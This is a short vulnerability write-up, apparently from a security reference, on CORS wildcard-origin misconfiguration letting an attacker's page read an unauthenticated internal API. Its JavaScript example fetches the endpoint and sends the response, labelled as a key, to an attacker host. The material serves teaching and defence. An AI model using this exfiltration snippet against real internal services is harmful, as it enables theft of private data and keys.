# Wildcard origin

## Description 
Host allows requests to be made from any origin. 

**Severity**: Low

## Exploit
If the server responds with a wildcard origin `*`, the browser does never send the cookies.  
However, if the server does not require authentication, it's still possible to access the data on the server.  
This can happen on internal servers that are not accessible from the Internet.  
The attacker's website can then pivot into the internal network and access the server's data without authentication. 

### Example
**Vulnerable Implementation**

```http
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

**Exploit**  
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-wildcard-origin--without-credentials)
